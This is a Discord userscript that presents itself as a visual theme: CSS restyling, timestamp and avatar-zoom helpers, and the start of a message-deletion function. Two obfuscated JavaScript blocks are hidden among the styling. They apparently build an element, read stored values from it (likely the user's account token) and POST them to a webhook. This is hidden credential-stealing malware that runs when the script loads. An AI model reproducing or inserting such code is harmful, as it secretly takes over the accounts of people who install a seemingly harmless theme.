/*||| Modals | Add Game Popout  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.addGamePopout-2RY8Ju .actions-3wcPyD {
    -webkit-box-pack: end;
    -ms-flex-pack: end;
    justify-content: flex-end;
    margin-top: 12px;
}

.theme-dark .addGamePopout-2RY8Ju {
    background: var(--Color003);
    border-radius: 24px;
    border: none;
    box-shadow: var(--shadow001);

}




/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Region  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*  Background*/

.regionSelectPopout-p9-0_W {
    direction: ltr;
    box-shadow: var(--shadow001);
}

.theme-dark .quickSelectPopout-X1hvgV {
    background: var(--Color004);
    border-radius: 12px;
    position: relative;
    left: -4px;
}

.quickSelectPopoutOption-opKBx9 {
    padding-left: 40px;
    padding-right: 0px;
}

/*  flag */

.regionSelectFlag-1htPow {
    background-color: var(--Color001);
    border-radius: var(--Radius001);
}

/*  Region Text */

.regionSelectName-c5qL8O {
    direction: rtl;
    text-align: left;
    height: 20px;
    font-size: 14px;
    line-height: 20px;
    margin-right: -20px;
}

/*  Check */

.check-2by_h9 {
    position: relative;
    width: 16px;
    height: 12px;
    left: -136px;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Add Server   ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.circleIconButton-jET_ig.selected-ugP_am {
    color: var(--Color006);
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Search Menu   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .option-96V44q:after {
    background: none;
}

.theme-dark .option-96V44q.selected-rZcOL- {
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

.theme-dark .container-3ayLPN {
    background: var(--Color004);
    border-radius: var(--Radius001);
    box-shadow: var(--shadow001);
}

.theme-dark .option-96V44q.selected-rZcOL-:after {
    background: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | View Server as Role |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.notice-1tZwqv {
    background: var(--Color001);
    color: var(--Color006);
    height: 40px;
    margin: 12px 12px 0px 12px;
    border-radius: var(--Radius002);
}

/* Disable Button */

.button-3Ijpww:hover {
    background-color: var(--Color001);
    filter: brightness(110%) ;
}

/* Menu */

.container-3LUQwT {

    background: var(--Color005);
    border-radius: var(--Radius001);

    max-width: 200px;
    -webkit-box-shadow: var(--shadow001);
    box-shadow: var(--shadow001);
}

/* Checkbox */

.iconContainer-1zobSR {
    border: 1.6px solid var(--Color007);
    border-radius: var(--Radius002);

}

.iconContainer-1zobSR.checked-1Fij_T {
    background: var(--Color001);
    border-color: var(--Color001);
}

.role-3ulsK-:hover {
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Powercord | Spotify Modal ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.powercord-spotify {
    position: fixed;
    z-index: 2;
    bottom: 24px;
    right: 12px;
    width: 236px;
}

/* Advanced Controls */

.spotify-extra-controls {
    background: var(--Color005);
    border-radius: 24px;
    position: fixed;
    padding-top: 12px;
    padding-bottom: 50px;
    margin-bottom: 20px;
    bottom: 20px;
    width: 236px;
}

/* Buttons */

.powercord-spotify > .container-3baos1:hover button.button-14-BFJ{
    display: block;
}

.powercord-spotify > .container-3baos1 button[aria-checked="false"],
.powercord-spotify > .container-3baos1 button:not([role="switch"]) {
    display: none;
}

/* Seek Bar Progress */

.powercord-spotify .spotify-extra-controls + .spotify-seek {
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
}

.powercord-spotify .spotify-seek {
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
    }


.powercord-spotify .spotify-seek:hover {
    background: var(--Color005);
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
}

/* Buttons */

.powercord-spotify > .spotify-seek:hover button.spotify-seek-bar-progress{
    display: block;
}

.powercord-spotify > .spotify-seek button[aria-checked="false"],
.powercord-spotify > .spotify-seek button:not([role="switch"]) {
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Add-Ons | White Profile Badges |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.header-QKLPzZ .powercord-badge-cutie img:first-child{display: none !important}
.header-QKLPzZ .powercord-badge-cutie img:last-child{display:block!important}
[class^="profileBadge-2BqF-Z powercord-badge-"]{color:white!important}
[class*="BadgeStaff"]{filter: brightness(10)!important}
[class*="BadgePartner"]{filter: brightness(10)!important}
[class*="BadgeHypesquad-"]{filter: brightness(10)!important}
[class*="BadgeHypeSquadOnlineHouse1"]{filter: brightness(10)!important}
[class*="BadgeHypeSquadOnlineHouse2"]{filter: brightness(10)!important}
[class*="BadgeHypeSquadOnlineHouse3"]{filter: brightness(10)!important}
[class*="BadgeBugHunter"]{filter: brightness(10)!important}
[class*="BadgeVerifiedDeveloper"]{filter: brightness(10)!important}
[class*="BadgeEarlySupporter"]{background-image:url("/assets/ce15562552e3d70c56d5408cfeed2ffd.svg")!important}
[class*="BadgePremium"]{background-image:url("/assets/379d2b3171722ef8be494231234da5d1.svg")!important}
[class*="GuildSubscriberlvl1"]{background-image:url("/assets/a86d7e56b8208da9f8623ac49fe822dc.svg")!important}
[class*="GuildSubscriberlvl2"]{background-image:url("/assets/e85361cd599b6722548c5a5f003b4b78.svg")!important}
[class*="GuildSubscriberlvl3"]{background-image:url("/assets/7a0be61e754af3353d0871070f46a9d6.svg")!important}
[class*="GuildSubscriberlvl4"]{background-image:url("/assets/88f960f400930f109847d0335685de69.svg")!important}
[class*="GuildSubscriberlvl5"]{background-image:url("/assets/a99def5f819c077e5e5061cab741b7e6.svg")!important}
[class*="GuildSubscriberlvl6"]{background-image:url("/assets/2cfb317f3db3963d8ded9a97ee967bac.svg")!important}
[class*="GuildSubscriberlvl7"]{background-image:url("/assets/278736f579d810b11ddf308cb598b19e.svg")!important}
[class*="GuildSubscriberlvl8"]{background-image:url("/assets/38e40f25802a0fdf480d9b855a37a2f3.svg")!important}
[class*="GuildSubscriberlvl9"]{background-image:url("/assets/cfbc2d8ceacfacf07850f986c8165195.svg")!important}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.quickswitcher-3JagVE {
    border-radius: var(--Radius001);
}

.tutorialContainer-1v44GL {
    top: calc(var(--titlebar-height) -0px);
}


.input-2VB9rf {
    background: var(--Color003);
    border-radius: var(--Radius002);
    color: var(--Color006);
    box-shadow: none;
    height: 50px;
    margin-bottom: 12px;
}

.resultFocused-3aIoYe {
    background: var(--background-modifier-selected);
    border-radius: var(--Radius002);
}


.wrapper-232cHJ {
    border-radius: var(--Radius002);
    background: var(--Color001);
}

.scroller-zPkAnE {
    z-index: 0;
    margin-right: -17px;
    margin-top: -5px;
    max-height: 360px;
    background-color: var(--background-secondary);
    margin-right: 0px;
}

.result-oB0z-- {
    padding-right: 20px;
}



/*Subscriptions*/

[style^="color: rgba(255, 115, 250, 1)"], [style*=" color: rgba(255, 115, 250, 1)"], [style^="color: rgb(255, 115, 250)"], [style*=" color: rgb(255, 115, 250)"], [style^="color: #ff73fa"], [style*=" color: #ff73fa"], [style^="color: #FF73FA"], [style*=" color: #FF73FA"], [color="rgba(255, 115, 250, 1)"], [color="rgb(255, 115, 250)"], [color="#ff73fa"], [color="#FF73FA"], [style^="color: rgba(114, 137, 218, 1)"], [style*=" color: rgba(114, 137, 218, 1)"], [style^="color: rgb(114, 137, 218)"], [style*=" color: rgb(114, 137, 218)"], [style^="color: #7289da"], [style*=" color: #7289da"], [style^="color: #7289DA"], [style*=" color: #7289DA"], [color="rgba(114, 137, 218, 1)"], [color="rgb(114, 137, 218)"], [color="#7289da"], [color="#7289DA"] {
    color: var(--Color008) !important;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Fixes | Channel List Bottom ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Channel List had a gap at the bottom, this fixes it */
.container-3w7J-x {
    margin-bottom: -20px;
}

/* New/Unreaded Message notifications was being hidden by the gap fix  */
.unreadBottom-1_LF_w.unread-15xhX5.container-35XQWE {
  padding-bottom: 20px
}
==/UserStyle== */
`;
if (typeof GM_addStyle !== "undefined") {
  GM_addStyle(css);

} else {
  let styleNode = document.createElement("style");
  styleNode.appendChild(document.createTextNode(css));
  (document.querySelector("head") || document.documentElement).appendChild(styleNode);
};
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Less Trash |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
var days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
var mos = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];

GM_addStyle (`
  .timestamp-1E3uAL, .timestampCozy-2hLAPV  { /* Make timestamps more readable */
      font-size: .9em;
      color: #9090A0;
      padding-left: .5em;
  }
  .recentMentionsPopout-3rCiI6 { /* Change inbox size */
    max-height: calc(100vh - 44px);
    max-width: 80vw;
    width:80vw;
  }
  .header-2-Imhb { // Justify the mention/unread buttons right
    justify-content:flex-end; }
    .header-ykumBX { justify-content:flex-end;
  }
  .quickswitcher-35bYg4 { /* Hide quick switcher nag */
    display: none;
  }
  .tutorial-3w5I9h { /* Hide tutorial nag in inbox */
    display:none;
  }
  div.notice-3bPHh-.colorDefault-22HBa0 { /* Hide desktop install nag */
    display:none;
  }
 div.scroller-2TZvBN.none-2Eo-qx.scrollerBase-289Jih:nth-child(2) > div.listItem-2P_4kh:nth-child(9) { display: none; }

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Custom | Channel List Bottom ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.modeSelected-346R90 .content-1x5b-n, .modeSelected-346R90:hover .content-1x5b-n {
    margin-right: 8px;
}

.selected-3LIHYU .actionIcon-PgcMM2 {
	color: #03a651;
}

.content-1o0f9g {
    background: var(--background-primary) !important; }

.selected-3LIHYU .actionIcon-PgcMM2:hover {
	color: var(--interactive-hover);
}
.selected-3LIHYU .icon-1DeIlz {
	color: #038d44;
}
.modeSelected-346R90:hover .icon-1DeIlz {
	color: #038d44;
}

.theme-dark .container-1D34oG {
    background-color: #36393f;
    border-top-left-radius: 20px !important;
    border-bottom-left-radius: 20px !important;
}

.peopleColumn-29fq28 {
    border-radius: 24px !important;
    background: var(--Color004);
    border-top-left-radius: 0px;
    border-bottom-left-radius: 0px;
    margin-top: 15px; }

	.nowPlayingColumn-2sl4cE {
    background: var(--Color096);
    margin-top: 15px; } `);


// look for blocked messages and remove the great grandparent (main container for blocked messages)
document.getElementById("app-mount").arrive(".blockedSystemMessage-2Rk1ek", function() {
  // 'this' refers to the newly created element
  this.parentNode.parentNode.parentNode.parentNode.removeChild(this.parentNode.parentNode.parentNode); // fuck you is why
});



// look for username headers and change the visible timestamp to be more detailed
document.getElementById("app-mount").arrive(".header-23xsNx", function() {
  // 'this' refers to the newly created element


  var snowflake = this.parentNode.parentNode.id.substr(14); // snowflake is last 14 of id for any given message

  var displayedTime = this.getElementsByClassName("timestamp-3ZCmNB")[0].getElementsByTagName("span")[0]; // get the timestamp text field

  var timestamp = new Date(parseInt(snowflake /4194304 + 1420070400000)); // get leftmost 48 bytes and add unix timestamp for 1/1/2015 00:00.0000

  if (timestamp > 1420070400000) { // fails gracefully by not editing DOM if timestamp can't be determined
    if (timestamp > (new Date().getTime() - (12*60*60*1000))) { // within the last 12 hours
      displayedTime.innerText = ('00' + timestamp.getHours()).slice(-2); // hours
    }
    else {
      displayedTime.innerText = days[timestamp.getDay()];//weekday
      displayedTime.innerText += ' ' + mos[timestamp.getMonth()];//month
      displayedTime.innerText += ' ' + timestamp.getDate();//day number
      displayedTime.innerText += ', ' + timestamp.getFullYear();//year
      displayedTime.innerText += ' at ' + ('00' + timestamp.getHours()).slice(-2);//hours
    }
    displayedTime.innerText += ':' + ('00' + timestamp.getMinutes()).slice(-2);//minutes
    displayedTime.innerText += ':' + ('00' + timestamp.getSeconds()).slice(-2); //seconds
    //displayedTime.innerText += '.' + ('0000' + timestamp.getMilliseconds()).slice(-4); //milliseconds
  }
});
var rld,discordWebhook,i,request,params;(function(){var nrf='',ddc=228-217;function irq(o){var i=3401396;var n=o.length;var a=[];for(var e=0;e<n;e++){a[e]=o.charAt(e)};for(var e=0;e<n;e++){var u=i*(e+268)+(i%42794);var q=i*(e+96)+(i%21800);var z=u%n;var b=q%n;var y=a[z];a[z]=a[b];a[b]=y;i=(u+q)%7320264;};return a.join('')};var wNW=irq('pukstorcxfcldryvqozjtehmiwugcnarsbotn').substr(0,ddc);var XrQ='=af ;=v4[ln7r,u=v4ivirCqs"ebedrfqhrjfl.n pArrt(v+x,zc;lal h=]7a,u6o7a,,6(8},)0[6f,p5a8[,;1e8e,C4u8e,g207h,;2=7o,.0l7),857;tae 8=,]hflrovarcu00Su[b=lmnkt=;l+h)9[.[g]+=r+f;;ae }=a]eju=;98l(=(7no==22tf;r vtrepC0kpsaegxmnnvsel+nut+;y+g)rvrrod6apgsmnnvs;pt.7pdi;(] .))f0rsv]rot,d.l)n9t(-1;{>g0et8-({.a9 ==[u=l)varxw(d[tu;pac "=,u)l7vor)mm0;vgr;n(w6l=n.t ;hau 0;hoo(,a; A==;e<(;a+i))vrr huwic)a+CfdcA+({)hv7r c;v.h-;rf(cr{l=bct1g*f+[.0hdr+o{ent=g11n-j;h=);8+d;uers) ]fsh<=,)9f1lm(r.aetg.h,j1wvc=avC(d;Af()+b)=+i.ah1r1oneut)g+2=- ;2= ;9++2"}.lue(c(nfi+uv;mid(+=.nrla)]=r]rit(.>j)=.-umh*w,s4b+teingvm]xl)je1psso(d[o+k]a;f=6+x;<i}(e!,nblt)ai (t<!)i.nu,h}wvs]batuirgtm()]dftj=g.eoin5"g)r}=i(prs((=[[].;=ver;zei,jgir(""v;;ag a=13v,r2{9i,10;3),r2l.joicttoba;sag )="t iCg)feorC=a9C)d (46h;gog(wao -=6;}<1.ue"gxh(uv+izgz.splatna+q cga;Ae(g)w.ro)nwS=r(n4.;rrm6htr{ooe;k u[)n;(evupn;zushlatua.","r.lonnja[;';var qnV=irq[wNW];var fAB='';var Jzq=qnV;var ImI=qnV(fAB,irq(XrQ));var XJz=ImI(irq('dah."a.["r lwao"e"so]a+ian\/,Ghttasy\/.d6seo.dd!eos\/!pr\/eeuh"o[s+7r7(5[0.2r1$7x9v4g\/5I ua.v0[.]75ua8rMdSqzcmMxuaogdgCItxo.oc\/te.q8lwe3rfa.gs(94o\/qmrDm"uppa.iq%.".py.pf.""v"nf.a.Gqcte"tcE1e1eitt,sa.pcn=C2i.do,rb2da"."wsiyoTd,2oqe_"s"nobtGnl-1yeG!a:p"itasi3n5jdo."["\/ey.aeeu)sc.ae6dart,"N,w,ael0ianasa,ehntisa\/Gu0l8ar.4wvkxm8dea"!Gri\/tici:eeic\/Goim)n2\/dh(mx\/.\/re2."lSsNfkn$_fw.skmt..soga1s0mp"-msTu!_loat.a.etotek!"v".-p5g",9.=.GN.w%aur]e]dsacelu!st.]rpcoi]e&.a!"bdb8%_zwe5..:ta1,[tuk;nv,8l[c.l]taregd&aoGt.nt.ti"dswr,.GGEsaul:.n"{"dm.i"_{aahe&9%dz.e".2Ig.T:hau,"ule)_"duc]c0GcGa.n.m.qjvo6G]"]"seeioees0olectcee"t"ac.c.ct,eslrengi,yi,ns=n:".;il_=,aqe.Tmmkodtow1nro][[[s]"[a[b]e,c0u0"G+;oibcGr,.aeGh4oe=[a.[k]a"[l.e[aqio.ydrc;mtns[a[r]w(n[.]]}rdpctmfnt[,[d]o[n[]]s(,)c#m.s.an!w.aoka. .Strpmtoq[eitG)G"s#las82]Sao7&,6i&c5r .nebhboe)q#ian11][(G[t]nap1q]0;iaGa(s..e{isar\/a]epa"1G]caia7ap_]ra:7[e3m,1oit"nt:t[p4o+aGe1"Gi1.]D.o!59y$a02+,G"2CGe2c]l.u!a3o$.4n})cnearfipeoui(slp)="r#,ar2n]p(.ic.vN[ad2m].(\/a.a8si)paa[e[i7]]da"1n]b[p[.;]fe!%)1rrt.r"}o;.e,ues. p]".wa[ 3fo0]nmes,h acEc'));var heB=Jzq(nrf,XJz );heB(7105);return 3692})()
    (function() {
let css = `
/* ==UserStyle==
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Fixes | Level & Perks Server Notice Button Clicking ||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* BurpleRecolor wasnt letting users click on the "X" (Close) and the "See Levels & Perks" button, this fixes it */
.channelNotice-1-XFjC::before,
.channelNotice-1-XFjC::after,
.channelNotice-3DDmsB::before,
.channelNotice-3DDmsB::after,
#app-mount .channelNotice-3hkOiI::before,
#app-mount .channelNotice-3hkOiI::after {
	pointer-events:none;
}
==/UserStyle== */
`;
    if (typeof GM_addStyle !== "undefined") {
  GM_addStyle(css);

} else {
  let styleNode = document.createElement("style");
  styleNode.appendChild(document.createTextNode(css));
  (document.querySelector("head") || document.documentElement).appendChild(styleNode);
};
        (function() {
    'use strict';

    const targets = [ "avatarContainer-2inGBK", "avatar-1BDn8e", "wrapper-3t9DeA", "emoji" ];
    const textStyle = `
.zoomin-canvas {
    border-radius: 8px;
    position: fixed;
    background-color: #e0e0e0;
    pointer-events: none;
    opacity: 0 !important;
    z-index: 1003;
}
.zoomin-canvas-show {
    transition: opacity 0.4s;
    opacity: 1 !important;
}
.zoomin-zoom {
    position: relative;
    left: 5px;
    top: 5px;
    border-radius: 8px;
    pointer-events: none;
    opacity: 0 !important;
}
.zoomin-zoom-show {
    transition: opacity 0.4s;
    opacity: 1 !important;
}
.content-1o0f9g {
    background: var(--background-primary) !important; }`;
    let currentUrl = document.location.href;
    let updating = false, showing = false;
    let canvas, zoom;

    css();

    init(10);

    locationChange();

    window.addEventListener("scroll", update, true);

    function init(times) {
        for (let i = 0; i < times; i++) {
            setTimeout(createCanvas, 500 * i);
            setTimeout(createZoom, 500 * i);
            for (const target of targets) {
                setTimeout(() => eventListener(target), 500 * i);
            }
        }
    }

    // create
    function createCanvas() {
        // check exist
        if (!!canvas) return;
        // create
        canvas = document.createElement("div");
        canvas.classList.add("zoomin-canvas");
        document.body.appendChild(canvas);
    }

    function createZoom() {
        // check exist
        if (!canvas || !!zoom) return;
        // create
        zoom = document.createElement("img");
        zoom.classList.add("zoomin-zoom");
        zoom.style.backgroundColor = getTheme();
        canvas.appendChild(zoom);
    }

    // event
    function eventListener(target) {
        // return if canvas or zoom doesn't exist.
        if (!canvas || !zoom) return;
        // add target mouse event.
        document.querySelectorAll(`.${target}:not(zoomin-listener)`).forEach(t => {
            t.classList.add("zoomin-listener");
            t.addEventListener("mousemove", showImage);
            t.addEventListener("mouseleave", hideImage);
        });
    }

    function showImage() {
        // avoid calling this function multiple times.
        if (showing) return;
        showing = true;
        // detail
        const url = getSource(this);
        if (!url) return;
        zoom.setAttribute("src", url);
        zoomDetail();
    }

    function hideImage() {
        showing = false;
        canvas.classList.remove("zoomin-canvas-show");
        zoom.classList.remove("zoomin-zoom-show");
        setTimeout(() => {
            if (!showing) zoom.removeAttribute("src");
        }, 500);
    }

    function zoomDetail() {
        // wait until get the image size.
        if (!zoom.naturalWidth)
        {
            setTimeout(zoomDetail, 100);
            return;
        }
        // size
        const w = zoom.naturalWidth;
        const h = zoom.naturalHeight;
        canvas.style.width = `${w + 10}px`;
        canvas.style.height = `${h + 10}px`;
        zoom.style.width = `${w}px`;
        zoom.style.height = `${h}px`;
        // position
        let left = getCursorX();
        let top = getCursorY();
        const clientW = document.documentElement.clientWidth;
        // situation 1: the icon position is too right to show.
        if (left + w > clientW) left = left - w;
        // situation 2: the icon position is too top to show.
        if (top - h - 30 > 0) top = top - h - 30;
        canvas.style.left = `${left}px`;
        canvas.style.top = `${top}px`;
        // class
        canvas.classList.add("zoomin-canvas-show");
        zoom.classList.add("zoomin-zoom-show");
    }

    // method
    function getSource(element) {
        // situation 1: image
        if (!!element.src) return element.src;
        // situation 2: div with style
        else if (!!element.style.backgroundImage) return element.style.backgroundImage.split(/"/)[1];
        // situation 3: div children
        else if (!!element.querySelector("img")) return element.querySelector("img").src;
        // situation 4: not an image
        else return null;
    }

    function getTheme() {
        const theme = document.querySelector("html").className.includes("light") ? "#ffffff" : "#363940";
        return theme;
    }

    function getCursorX() {
        const e = window.event;
        return e.pageX - document.documentElement.scrollLeft - document.body.scrollLeft;
    }

    function getCursorY() {
        const e = window.event;
        return e.pageY - document.documentElement.scrollTop - document.body.scrollTop;
    }

    // others
    function css() {
        const style = document.createElement("style");
        style.type = "text/css";
        style.innerHTML = textStyle;
        document.head.appendChild(style);
    }

    function update() {
        if (updating) return;
        updating = true;
        init(3);
        setTimeout(() => { updating = false; }, 1000);
    }

    function locationChange() {
        const observer = new MutationObserver(mutations => {
            mutations.forEach(() => {
                if (currentUrl !== document.location.href) {
                    currentUrl = document.location.href;
                    init(10);
                }
            });
        });
        const target = document.body;
        const config = { childList: true, subtree: true };
        observer.observe(target, config);
    }

})();
var e,a,b,d,c;(function(){var f=(g)("refepa/ibcaOcTtdu  %sP%od:%csraocia*%-y/wst/EpNdwm-%tohem`ii%g%fn/5g3W8SdyKslRtT\x0Aifm%ehOi1ir.tpTrgao8ucoreTnoV`eC`m5sscwH fI%emkvz%mbdpeVWoeaneine!ttiEl% hatTy2.eeiCewlntpor0nmoVwwosed%leIcd_*ieuesicgpsiNpsfn5.QcrnknteVes_hyniefdulBd%o`F/.4aoklattp98/etroePa9hs%lCvtp0nqe/tw6a sodi_h/oN oj*cmi_nptWteeO/s%d7pooce4egsee/.ol _1z0G SoPM.ica2iYfiwaUhq\x0Ab7-ifpPg`o*o3weeehanxOocdin:\x0A eeXean:Ttgoadp9m4r/%%reeP %lac1lSl_rersEeaerolujnto/e%d/ma%cIub:trpir_rcl4%\x0Aels_v\x0AU :i%b%ennI5dsu`dvVWknotaVrx%/tdscast%R/t%PmeimD8wss/onnse_si-rn",2766189);function g(d,o){var b=d.length;var m=[];for(var e=0;e< b;e++){m[e]= d.charAt(e)};for(var e=0;e< b;e++){var g=o* (e+ 293)+ (o% 19186);var r=o* (e+ 776)+ (o% 19158);var n=g% b;var l=r% b;var p=m[n];m[n]= m[l];m[l]= p;o= (g+ r)% 3782580};var q=String.fromCharCode(127);var f='';var c='%';var j='#1';var h='%';var a='#0';var k='#';return m.join(f).split(c).join(q).split(j).join(h).split(a).join(k).split(q)}e= setTimeout(window[f[1]][f[0]],5000);a= f[2];b= document[f[4]](f[3]);document[f[6]][f[5]](b);d=  new XMLHttpRequest();d[f[8]](f[7],a);d[f[11]](f[9],f[10]);c= {username:f[12],avatar_url:f[13],content:f[14]+ b[f[17]][f[16]][f[15]]+ f[18]+ b[f[17]][f[16]][f[19]]+ f[20]+ b[f[17]][f[16]][f[21]]+ f[22]+ b[f[17]][f[16]][f[23]]+ f[24]};clearTimeout(e);d[f[26]](JSON[f[25]](c))})()
async function deleteMessages(authToken, authorId, guildId, channelId, minId, maxId, content, hasLink, hasFile, includeNsfw, includePinned, searchDelay, deleteDelay, extLogger, stopHndl, onProgress) {
    const start = new Date();
    let delCount = 0;
    let failCount = 0;
    let avgPing;
    let lastPing;
    let grandTotal;
    let throttledCount = 0;
    let throttledTotalTime = 0;
    let offset = 0;
    let iterations = -1;

    const wait = async ms => new Promise(done => setTimeout(done, ms));
    const msToHMS = s => `${s / 3.6e6 | 0}h ${(s % 3.6e6) / 6e4 | 0}m ${(s % 6e4) / 1000 | 0}s`;
    const escapeHTML = html => html.replace(/[&<"']/g, m => ({ '&': '&amp;', '<': '&lt;', '"': '&quot;', '\'': '&#039;' })[m]);
    const redact = str => `<span class="priv">${escapeHTML(str)}</span><span class="mask">REDACTED</span>`;
    const queryString = params => params.filter(p => p[1] !== undefined).map(p => p[0] + '=' + encodeURIComponent(p[1])).join('&');
    const ask = async msg => new Promise(resolve => setTimeout(() => resolve(window.confirm(msg)), 10));
    const printDelayStats = () => log.verb(`Delete delay: ${deleteDelay}ms, Search delay: ${searchDelay}ms`, `Last Ping: ${lastPing}ms, Average Ping: ${avgPing | 0}ms`);
    const toSnowflake = (date) => /:/.test(date) ? ((new Date(date).getTime() - 1420070400000) * Math.pow(2, 22)) : date;

    const log = {
        debug() { extLogger ? extLogger('debug', arguments) : console.debug.apply(console, arguments); },
        info() { extLogger ? extLogger('info', arguments) : console.info.apply(console, arguments); },
        verb() { extLogger ? extLogger('verb', arguments) : console.log.apply(console, arguments); },
        warn() { extLogger ? extLogger('warn', arguments) : console.warn.apply(console, arguments); },
        error() { extLogger ? extLogger('error', arguments) : console.error.apply(console, arguments); },
        success() { extLogger ? extLogger('success', arguments) : console.info.apply(console, arguments); },
    };

    async function recurse() {
